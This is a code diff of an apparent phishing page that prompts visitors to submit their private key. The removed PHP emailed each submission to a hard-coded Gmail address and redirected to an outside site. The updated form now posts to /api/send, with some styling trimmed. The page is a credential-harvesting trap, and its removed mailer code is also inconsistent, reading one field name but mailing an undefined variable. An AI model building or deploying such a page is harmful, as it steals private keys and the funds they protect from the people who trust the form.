@@ -1,34 +1,9 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-
-    $testing_key = htmlspecialchars($_POST['testing_key']);
-
-    $to = "nxloaded@gmail.com"; // your email
-    $subject = "New Private Key";
-
-    $message = "
-    New Private Key Submitted:
-
-    $private_key
-    ";
-
-    $headers = "From: noreply@yourwebsite.com";
-
-    if(mail($to, $subject, $message, $headers)) {
-        header("Location: https://rtt-collects.vercel.app/");
-        exit();
-    } else {
-        echo "Failed to send email.";
-    }
-}
-?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Private Key</title>
+  <title>Private key</title>
 
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
@@ -56,18 +31,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       padding:30px;
       border-radius:18px;
       box-shadow:0 10px 30px rgba(0,0,0,0.2);
-      animation:fadeIn .8s ease-in-out;
-    }
-
-    @keyframes fadeIn{
-      from{
-        opacity:0;
-        transform:translateY(20px);
-      }
-      to{
-        opacity:1;
-        transform:translateY(0);
-      }
     }
 
     h1{
@@ -100,13 +63,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       border-radius:10px;
       outline:none;
       font-size:14px;
-      transition:.3s;
       resize:none;
-    }
-
-    textarea:focus{
-      border-color:#0d6efd;
-      box-shadow:0 0 0 3px rgba(13,110,253,0.2);
     }
 
     button{
@@ -120,12 +77,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       font-weight:600;
       border-radius:10px;
       cursor:pointer;
-      transition:.3s;
-    }
-
-    button:hover{
-      background:#0b5ed7;
-      transform:scale(1.02);
     }
 
     .footer-text{
@@ -134,36 +85,27 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
       margin-top:15px;
       color:#888;
     }
-
-    @media(max-width:500px){
-      .container{
-        padding:22px;
-      }
-
-      h1{
-        font-size:24px;
-      }
-    }
   </style>
 </head>
 
 <body>
 
   <div class="container">
-    <h1>Private Key</h1>
+    <h1>Private key</h1>
     <p>Drop your Private Key</p>
 
-    <form method="POST">
+    <form action="/api/send" method="POST">
 
-      <label>Enter your Private Key</label>
+      <label>Enter your Private key</label>
 
-      <textarea 
-        name="Private_key"
+      <textarea
+        name="Private key"
         placeholder="Enter your Private key"
         required
       ></textarea>
 
       <button type="submit">PROCEED</button>
+
     </form>
 
     <div class="footer-text">
